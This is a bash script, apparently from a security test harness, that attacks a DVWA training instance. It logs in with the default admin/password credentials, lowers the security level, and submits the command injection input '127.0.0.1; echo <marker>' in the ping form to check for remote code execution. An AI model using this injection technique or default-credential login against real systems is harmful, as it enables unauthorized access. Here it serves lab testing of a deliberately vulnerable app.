#!/usr/bin/env bash
# Pre-staged primitive: DVWA OS command injection (genuine http-dvwa).
#
# STANDARD PROCEDURE ONLY — DVWA is a deliberately vulnerable *training* app, so
# this primitive follows DVWA's OWN documented lesson procedure with a plain HTTP
# client (curl): authenticate with the default training credentials, set the
# security level to "low", submit the documented Command Injection input, and
# detect the echoed marker. No novel exploit/malware is authored here; the technique
# is DVWA's published Command Injection module. The courier
# (harness.live_targets.SubprocessTransport.deliver) runs this from the no-egress
# attacker node and parses EXACTLY ONE JSON line:
#     {"reached_and_executed": <bool>, "unauthorized_access": <bool>}
#
# reached_and_executed = the vulnerable module answered and the injection request ran.
# unauthorized_access  = the injected command's output (our marker) came back (RCE).
#
# NB: the DVWA database must have been initialized once at provisioning time
# ("Create / Reset Database" on setup.php — done by the targets role); an attacker
# does not reset it. This primitive only authenticates and injects.
#
# Usage: dvwa_cmd_injection.sh <host> <port> <path>   (scoped to 172.31.66.0/24)
set -uo pipefail

HOST="${1:?host}"; PORT="${2:?port}"; PATH_="${3:-/}"
BASE="http://${HOST}:${PORT}"
MARKER="MTD_$$_OBJB"
CJAR="$(mktemp)"; trap 'rm -f "$CJAR"' EXIT

emit() { printf '{"reached_and_executed": %s, "unauthorized_access": %s}\n' "$1" "$2"; }

# Extract DVWA's anti-CSRF user_token from a page on stdin.
csrf_token() { grep -oE "user_token'[^0-9]*value='[a-f0-9]+'" | grep -oE "[a-f0-9]{32}" | head -n1; }

# 1. Reach: load the login page (seeds the session cookie + first CSRF token).
LOGIN_PAGE="$(curl -s -m 15 -c "$CJAR" "${BASE}/login.php")"
if [ -z "$LOGIN_PAGE" ]; then emit false false; exit 0; fi
LTOK="$(printf '%s' "$LOGIN_PAGE" | csrf_token)"

# 2. Authenticate with DVWA's default TRAINING credentials (admin/password).
curl -s -m 15 -b "$CJAR" -c "$CJAR" -o /dev/null \
  --data "username=admin&password=password&Login=Login&user_token=${LTOK}" \
  "${BASE}/login.php"

# 3. Set the security level to "low" (DVWA's documented "DVWA Security" step).
STOK="$(curl -s -m 15 -b "$CJAR" -c "$CJAR" "${BASE}/security.php" | csrf_token)"
curl -s -m 15 -b "$CJAR" -c "$CJAR" -o /dev/null \
  --data "security=low&seclev_submit=Submit&user_token=${STOK}" \
  "${BASE}/security.php"

# 4. Submit the documented Command Injection input: `; echo <marker>` in the ping
#    "ip" field of the vulnerable module. At "low" the form carries no CSRF token.
OUT="$(curl -s -m 20 -b "$CJAR" -c "$CJAR" \
  --data-urlencode "ip=127.0.0.1; echo ${MARKER}" \
  --data-urlencode "Submit=Submit" \
  "${BASE}/vulnerabilities/exec/" 2>/dev/null)"

if [ -z "$OUT" ]; then emit false false; exit 0; fi   # exec redirected (not authed) -> not executed
if printf '%s' "$OUT" | grep -q "$MARKER"; then emit true true; else emit true false; fi
